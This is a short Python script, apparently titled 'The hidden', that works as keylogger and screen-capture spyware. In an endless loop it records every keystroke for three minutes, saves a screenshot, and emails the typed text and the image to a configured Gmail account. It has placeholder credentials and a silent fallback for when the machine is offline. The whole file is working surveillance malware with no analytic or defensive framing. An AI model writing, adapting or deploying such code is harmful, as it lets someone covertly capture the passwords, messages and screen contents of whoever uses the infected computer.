'''

The hidden ^_^ 

Created on 27/10/2017

@author: 
'''
from e import send_mail
import keyboard as kb
from time import sleep
from PIL import ImageGrab

your_mail = 'yourEmailAddress@gmail.com'
passw='your password'

while True:
    
    kb.start_recording()
    sleep(180)
    ImageGrab.grab().save("screenshot.jpg", "JPEG")
    events = kb.stop_recording()
    keys = kb.get_typed_strings(events)
    image = open('screenshot.jpg', 'rb')

    # If there is not internet conexion, the script just save a screenshot    
    try:
        send_mail(your_mail, your_mail, passw, next(keys), image)
    except:
        ImageGrab.grab().save("screenshot.jpg", "JPEG")
